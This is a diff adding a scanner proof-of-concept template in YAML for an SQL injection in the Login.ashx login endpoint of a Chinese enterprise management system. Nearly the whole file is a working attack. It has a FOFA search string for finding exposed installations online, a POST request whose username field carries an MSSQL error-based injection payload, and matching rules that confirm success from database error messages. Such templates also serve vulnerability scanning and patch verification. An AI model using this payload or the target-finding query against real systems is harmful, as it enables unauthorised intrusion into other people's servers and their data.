@@ -1,0 +1,21 @@
+id: poc-yaml-cysoft-login-ashx-sqli
+info:
+  name: 超易企业管理系统 Login.ashx SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 超易企业管理系统
+  fofa: body="超易管理系统登录"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /ajax/Login.ashx?Date=%271721821198459%27
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: username=admin' AND 4026 IN (SELECT (sys.fn_varbintohexstr(hashbytes('MD5','{{.t1}}'))))--&password=1&loginguid=b84898ec-9884-4b54-8b44-a90bf0db0183&logintype=pc
+  expression: "status_code == 200 && \ncontains(body,\"0x\"+t2) &&\ncontains(body,\"\
+    转换成数据类型 int 时失败\") &&\ncontains(body,\"在将 nvarchar 值\") &&\n!contains(body,\"\
+    <\")\n"
+transport: http
